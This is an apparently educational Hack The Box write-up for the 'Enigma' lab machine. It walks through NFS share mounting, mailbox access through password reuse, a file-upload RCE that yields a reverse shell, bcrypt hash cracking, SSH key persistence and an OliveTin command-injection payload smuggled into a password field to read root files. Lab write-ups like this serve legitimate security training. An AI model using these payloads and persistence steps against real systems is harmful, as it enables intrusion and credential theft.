# HTB - Enigma

**Author:** Hero  
**Platform:** Hack The Box  
**Machine:** Enigma  
**Difficulty:** Easy  
**Target:** Linux  
**Focus:** NFS Enumeration, Information Disclosure, Credential Reuse, File Upload, Remote Code Execution, Lateral Movement, SSH Key Authentication, Port Forwarding, OS Command Injection

---

## 1. Executive Summary

The initial foothold was obtained by enumerating an exposed NFS share and discovering sensitive information in an employee onboarding PDF.

The document revealed credentials belonging to Kevin. By identifying password reuse, I was able to access Sarah's mailbox and retrieve administrative credentials for OpenSTAManager.

After authenticating to OpenSTAManager, I exploited **CVE-2026-38751**, an arbitrary file upload vulnerability that resulted in Remote Code Execution (RCE) and an initial shell as `www-data`.

During post-exploitation enumeration, I discovered database credentials stored in plaintext inside `config.inc.php`. These credentials allowed access to the application's MySQL database, where I extracted and cracked a bcrypt password hash belonging to Haris.

Using the recovered password, I obtained access to Haris's account and established SSH authentication using a generated SSH key.

Finally, I discovered OliveTin running locally on port `1337`. After forwarding the port through SSH, I exploited **CVE-2026-27626**, an OS command injection vulnerability, to execute commands as root and obtain the root flag.

---

## 2. Reconnaissance

### 2.1 Port Scanning

I started with a full TCP port scan to identify exposed services.

```bash
nmap -p- --min-rate 5000 <TARGET_IP>
```

After identifying the open ports, I performed service and default-script enumeration:

```bash
nmap -sC -sV -p <OPEN_PORTS> <TARGET_IP>
```

The scan revealed several interesting services, particularly:

- HTTP (Port 80)
- NFS (Port 2049)
- POP3
- IMAP

The presence of POP3 and IMAP suggested that the machine might expose an email service, while NFS provided another potential entry point.

### 2.2 Web Enumeration

I initially accessed the web server using its IP address but did not discover anything particularly interesting.

I suspected that the application might require a hostname, so I added the target to `/etc/hosts`.

```bash
sudo nano /etc/hosts
```

Added:

```text
<TARGET_IP> enigma.htb
```

After refreshing the page, I continued with service enumeration.

### 2.3 NFS Enumeration

Since NFS was exposed, I checked the available exports.

```bash
showmount -e <TARGET_IP>
```

The command revealed an accessible NFS share.

I created a local directory and mounted the exported share:

```bash
mkdir test
sudo mount -t nfs enigma.htb:<NFS_PATH> test
```

Then I inspected its contents:

```bash
cd test
ls -la
```

I discovered a PDF document:

`new_employee_access.pdf`

Instead of opening it manually, I extracted its contents using `pdftotext`.

```bash
pdftotext new_employee_access.pdf ~/Desktop/info.txt
```

After reviewing the extracted text, I discovered:

- A reference to the mail subdomain.
- Credentials belonging to Kevin.

### 2.4 Email Enumeration

I added the mail subdomain to `/etc/hosts`:

```text
<TARGET_IP> mail.enigma.htb
```

I then accessed the email service using Kevin's credentials.

Kevin had received an email from Sarah containing information about the company and his onboarding.

Since this was a lab environment, I tested whether Sarah was reusing the same password.

The password worked successfully!

After logging in as Sarah, I discovered another email containing administrative credentials for OpenSTAManager.

These credentials provided the next attack path.

---

## 3. Initial Access – OpenSTAManager RCE

### 3.1 Application Enumeration

Using the credentials obtained from Sarah's mailbox, I authenticated to the OpenSTAManager web application.

I identified the application version and searched for publicly disclosed vulnerabilities affecting it.

The application was vulnerable to multiple issues. I decided to investigate:

**CVE-2026-38751**

### 3.2 Understanding CVE-2026-38751

CVE-2026-38751 is an arbitrary file upload vulnerability (CWE-434) affecting the module update functionality in OpenSTAManager versions 2.10 and earlier.

The vulnerable functionality is located at:

```text
modules/aggiornamenti/upload_modules.php
```

An authenticated attacker can upload a malicious ZIP archive containing executable files, potentially resulting in Remote Code Execution.

### 3.3 Exploitation

I downloaded the exploit and executed it against the target application.

```bash
./openstamanager \
  --url http://support_001.enigma.htb \
  -U <USERNAME> \
  -P <PASSWORD> \
  --lhost <LOCAL_IP> \
  --lport <LOCAL_PORT>
```

After successful exploitation, I received a shell on the target machine.

I verified my current privileges:

```bash
whoami
```

**Result:**

```text
www-data
```

I now had an initial foothold on the machine.

However, the `www-data` account had limited permissions, and I could not access other users' home directories.

I needed to investigate the system further.

---

## 4. Lateral Movement – www-data to Haris

### 4.1 Discovering Database Credentials

During post-exploitation enumeration, I discovered the application's configuration file:

```text
config.inc.php
```

The file contained database credentials stored in plaintext.

I extracted the credentials and used them to authenticate to MySQL.

```bash
mysql -u brollin -p'<DB_PASSWORD>'
```

After successfully connecting, I enumerated the available databases.

```sql
SHOW DATABASES;
```

I identified the OpenSTAManager database:

```sql
USE openstamanager;
```

Next, I listed the available tables:

```sql
SHOW TABLES;
```

I found the users table:

```sql
SELECT * FROM zz_users;
```

The query revealed password hashes belonging to application users, including Haris.

### 4.2 Password Hash Cracking

I extracted Haris's bcrypt hash and saved it locally.

Then I used John the Ripper with the RockYou wordlist:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
```

John successfully recovered the password:

```text
bestfriends
```

### 4.3 SSH Key Authentication

I attempted to authenticate to the machine over SSH using the recovered password, but the account required SSH key authentication.

To overcome this, I generated a new Ed25519 key pair on my attacking machine.

```bash
ssh-keygen -t ed25519 -f haris-key -N ""
```

I displayed the public key:

```bash
cat haris-key.pub
```

Since I already had shell access to the target, I switched to Haris using the recovered password:

```bash
su haris
```

Then I created the SSH directory:

```bash
mkdir -p /home/haris/.ssh
```

I added my public key to the authorized keys file:

```bash
echo "<PUBLIC_KEY>" >> /home/haris/.ssh/authorized_keys
```

Finally, I configured the correct permissions:

```bash
chmod 700 /home/haris/.ssh
chmod 600 /home/haris/.ssh/authorized_keys
```

From my attacking machine, I connected using the generated private key:

```bash
ssh -i haris-key haris@<TARGET_IP>
```

**Success!**

I obtained SSH access as Haris.

---

## 5. Privilege Escalation – Haris to Root

### 5.1 Discovering OliveTin

After obtaining SSH access as Haris, I continued enumerating the system for potential privilege escalation vectors.

During enumeration, I discovered an interesting service running locally on port:

```text
1337
```

Further investigation identified the service as **OliveTin**, which was running with root privileges.

Since the service was bound to the local interface, I needed to access it through SSH port forwarding.

### 5.2 SSH Port Forwarding

I established a local port forward from my attacking machine to the target's localhost port 1337.

```bash
ssh -i haris-key -L 1337:127.0.0.1:1337 haris@<TARGET_IP>
```

This forwarded my local port `1337` to the target's local port `1337`.

I could now access the OliveTin web interface locally.

### 5.3 Understanding CVE-2026-27626

CVE-2026-27626 is a critical OS command injection vulnerability (CWE-78) affecting OliveTin versions up to and including 3000.10.0.

The vulnerability occurs because password-typed inputs bypass the application's shell safety validation.

When these inputs are passed to a shell through `sh -c`, an attacker can inject arbitrary operating system commands.

Since OliveTin was running as root, successful exploitation could result in root-level command execution.

### 5.4 Exploiting OliveTin

I investigated the available functionality and identified a vulnerable password input in the database password plugin.

To verify command execution, I supplied the following payload:

```text
x'; id;'
```

The application executed the injected command and returned the result.

The output confirmed that the command was executed with root privileges:

```text
uid=0(root)
```

This confirmed successful command injection.

I then used the same injection technique to read the root flag:

```text
x'; cat /root/root.txt;'
```

The application returned the contents of the root flag.

**Root access successfully obtained!**

---

## 6. Attack Path Summary

The complete attack chain was:

```text
NFS Enumeration
      |
      v
Sensitive PDF Discovery
      |
      v
Kevin Credentials
      |
      v
Password Reuse
      |
      v
Sarah Email Access
      |
      v
OpenSTAManager Admin Credentials
      |
      v
CVE-2026-38751
      |
      v
Initial Shell (www-data)
      |
      v
Database Credential Disclosure
      |
      v
MySQL Enumeration
      |
      v
Haris Password Hash
      |
      v
Bcrypt Hash Cracking
      |
      v
SSH Key Authentication
      |
      v
Haris
      |
      v
SSH Port Forwarding (1337)
      |
      v
OliveTin
      |
      v
CVE-2026-27626
      |
      v
ROOT
```

---

## 7. Key Takeaways

This machine demonstrated several important penetration testing techniques:

- **NFS Enumeration:** Identifying exposed network shares and extracting sensitive information.
- **Information Disclosure:** Recovering credentials from an employee onboarding document.
- **Password Reuse:** Leveraging reused credentials to gain access to another user's mailbox.
- **Web Application Exploitation:** Exploiting an authenticated arbitrary file upload vulnerability to achieve RCE.
- **Post-Exploitation Enumeration:** Finding sensitive database credentials in application configuration files.
- **Database Enumeration:** Extracting user password hashes from MySQL.
- **Password Cracking:** Recovering bcrypt passwords using John the Ripper.
- **SSH Key Authentication:** Establishing persistent SSH access using a generated Ed25519 key pair.
- **Port Forwarding:** Accessing a service bound to localhost through an SSH tunnel.
- **Command Injection:** Exploiting OliveTin to achieve root-level command execution.

---

**Machine Completed: Enigma**

**Author: hero**
